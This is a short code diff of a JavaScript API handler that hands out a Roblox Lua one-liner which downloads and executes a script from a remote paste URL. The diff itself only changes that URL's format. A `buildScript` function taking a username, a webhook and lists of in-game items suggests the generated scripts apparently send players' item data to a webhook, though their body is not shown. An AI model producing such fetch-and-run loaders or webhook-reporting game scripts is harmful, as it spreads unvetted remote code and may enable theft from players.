@@ -20,9 +20,9 @@ export default async function handler(req, res) {
             userId
         );
 
-        // --- USAR URL RAW a través de api/paste ---
+        // URL limpia con /raw/
         const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
-        const rawUrl = `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
+        const rawUrl = `${baseUrl}/raw/${pasteId}`;
 
         return res.status(200).json({
             loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
@@ -39,7 +39,7 @@ export default async function handler(req, res) {
 }
 
 // ============================================================
-//  CONSTRUIR SCRIPT (sin cambios)
+//  CONSTRUIR SCRIPT
 // ============================================================
 function buildScript(username, webhook, mode, brainrots, skins, gears) {
     function luaTable(arr, indent = '    ') {
